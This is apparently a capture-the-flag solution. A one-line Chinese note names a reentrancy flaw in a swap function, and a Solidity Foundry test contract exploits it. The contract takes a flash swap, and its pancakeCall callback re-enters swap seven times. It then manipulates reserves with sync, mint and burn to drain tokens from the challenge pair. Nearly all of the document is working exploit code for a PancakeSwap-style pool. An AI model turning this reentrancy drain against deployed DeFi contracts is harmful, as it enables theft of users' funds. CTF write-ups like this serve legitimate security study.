swap 函数中存在重入攻击。可以反复 swap 获取代币。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.20;

import "./utils/BaseTest.sol";
import "./utils/Utilities.sol";
import "src/Challenge.sol";

contract TestSolver is BaseTest {
    Challenge private chal;

    constructor() {
    }

    function setupChallenge() public {
        chal = new Challenge(address(0x0));
    }

    function run() public {
        setupChallenge();
        chal.pair().swap(7 * 1e18, 7 * 1e18, address(this), "1");
        chal.pair().transfer(address(chal.pair()), chal.pair().balanceOf(address(this)));
        chal.pair().burn(address(this));

        chal.token0().transfer(address(chal.randomFolks()), 99 * 1e18);
        chal.token1().transfer(address(chal.randomFolks()), 99 * 1e18);

        assertTrue(chal.isSolved(), "Not solved.");
    }

    function testSolve() public {
        run();
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (amount0 == 7 * 1e18) {
            chal.pair().sync();

            for (uint256 i = 0; i < 7; i++) {
                chal.pair().swap(90 * 1e18, 90 * 1e18, address(this), "1");
            }
            chal.faucet();
            chal.token0().transfer(address(chal.pair()), 1 * 1e18);
            chal.token1().transfer(address(chal.pair()), 1 * 1e18);
        } else {
            chal.pair().sync();

            chal.token0().transfer(address(chal.pair()), 90 * 1e18);
            chal.token1().transfer(address(chal.pair()), 90 * 1e18);

            chal.pair().mint(address(this));

            chal.token0().transfer(address(chal.pair()), 1 * 1e18);
            chal.token1().transfer(address(chal.pair()), 1 * 1e18);
        }
    }
}
```

